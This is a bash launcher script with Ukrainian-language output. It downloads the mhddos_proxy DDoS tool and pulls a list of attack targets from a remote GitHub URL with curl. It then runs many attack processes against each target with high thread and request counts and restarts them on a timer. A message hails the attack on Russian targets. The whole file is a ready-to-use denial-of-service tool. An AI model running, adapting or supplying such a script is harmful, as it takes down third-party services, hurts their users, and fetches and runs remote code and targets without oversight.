#!/bin/bash

# More safety, by turning some bugs into errors.
# Without `errexit` you don’t need ! and can replace
# PIPESTATUS with a simple $?, but I don’t do that.
set -o errexit -o pipefail -o noclobber -o nounset

# -allow a command to fail with !’s side effect on errexit
# -use return value from ${PIPESTATUS[0]}, because ! hosed $?
! getopt --test > /dev/null
if [[ ${PIPESTATUS[0]} -ne 4 ]]; then
    echo "На жаль, `getopt --test` завершився з помилкою. Будь ласка, встановіть enhanced getopt."
    exit 1
fi

OPTIONS=r:t:p:s:u:
LONGOPTS=refresh-interval:,thread-count:,process-count:,stats-interval:,url-with-targets:

# -regarding ! and PIPESTATUS see above
# -temporarily store output to be able to check for errors
# -activate quoting/enhanced mode (e.g. by writing out “--options”)
# -pass arguments only via   -- "$@"   to separate them correctly
! PARSED=$(getopt --options=$OPTIONS --longoptions=$LONGOPTS --name "$0" -- "$@")
if [[ ${PIPESTATUS[0]} -ne 0 ]]; then
    # e.g. return value is 1
    #  then getopt has complained about wrong arguments to stdout
    exit 2
fi

# read getopt’s output this way to handle the quoting right:
eval set -- "$PARSED"

refresh_interval="15m"
thread_count="250"
process_count="20"
stats_interval="60"
url_with_targets="https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets"

# now enjoy the options in order and nicely split until we see --
while true; do
    case "$1" in
        -r|--refresh-interval)
            refresh_interval="$2"
            shift 2
            ;;
        -t|--thread-count)
            thread_count="$2"
            shift 2
            ;;
        -p|--process-count)
            process_count="$2"
            shift 2
            ;;
        -s|--stats-interval)
            stats_interval="$2"
            shift 2
            ;;
        -u|--url-with-targets)
            url_with_targets="$2"
            shift 2
            ;;
        --)
            shift
            break
            ;;
        *)
            echo "Невідома опція запуску $1"
            exit 3
            ;;
    esac
done

PROXY_PROJECT_NAME=mhddos_proxy
PROXY_PROJECT_VERSION=addeea253d53bbf90d0a320367d8974183c4b480

PROXY_DIR=~/$PROXY_PROJECT_NAME
PROXY_FILE=$PROXY_DIR/mhddos/files/proxies/proxies.txt

echo "Підготовка середовища для запуску..."

# make sure ifstat and awk are installed
apt-get install ifstat gawk -y &> /dev/null

# remove unnecessary built-in python dependencies
python3 -m pip uninstall google-colab datascience -y &> /dev/null
python3 -m pip install --upgrade pip &> /dev/null

# run within user directory
cd ~

# delete old proxy dir if present
if [ -d $PROXY_DIR ]; then
    rm -r $PROXY_DIR &> /dev/null
fi

# download specific mhddos_proxy version
git clone https://github.com/porthole-ascend-cinnamon/$PROXY_PROJECT_NAME.git &> /dev/null
cd $PROXY_DIR
git checkout $PROXY_PROJECT_VERSION &> /dev/null

# install mhddos_proxy dependencies
python3 -m pip install -r requirements.txt &> /dev/null

echo "Підготовкy середовища для запуску завершено"

# Restart attacks and update targets every $refresh_interval
while true
do
    # kill old copies of mhddos_proxy
    echo "(ре)старт програми..."
    if pgrep -f runner.py &> /dev/null; then pkill -f runner.py &> /dev/null; fi
    if pgrep -f ./start.py &> /dev/null; then pkill -f /start.py &> /dev/null; fi
    if pgrep -f ifstat &> /dev/null; then pkill -f ifstat &> /dev/null; fi
    echo "(ре)старт програми завершено"

    # delete old proxy file if present
    if [ -f $PROXY_FILE ]; then
        rm $PROXY_FILE
    fi

    # load targets and process them one-by-one
    curl -s $url_with_targets | cat | grep "^[^#]" | while read -r target_command ; do
      echo "Запускаємо атаку на $target_command, задіявши $process_count процесів, кожний з $thread_count потоками"

      for (( i=1; i<=process_count; i++ ))
      do
          cd $PROXY_DIR
          python3 runner.py $target_command -t $thread_count -p 25200 --rpc 1000 &> /dev/null&

          # wait till the first process initializes proxy file properly
          if [ ! -f $PROXY_FILE ]; then
              echo "Перевірка проксі. Це може зайняти декілька хвилин..."

              while [ ! -f $PROXY_FILE ]
              do
                  sleep 1
              done

              echo "Перевірку проксі завершено"
          fi
      done
  done
  echo -e "Атака почалася (russian warship go f*ck yourself!).\nТут відображатиметься поточний час (розбіжність - 3 години), вхідна та вихідна швидкість у MBit за секунду.\nНаступна перевірка цілей за $refresh_interval\n"

  ifstat -i eth0 -t -b -n $stats_interval/$stats_interval | awk '$1 ~ /^[0-9]{2}:/{$2/=1024;$3/=1024;printf "[%s] %10.2f ↓MBit/s↓  %10.2f ↑MBit/s↑\n",$1,$2,$3}'&

  sleep $refresh_interval

done
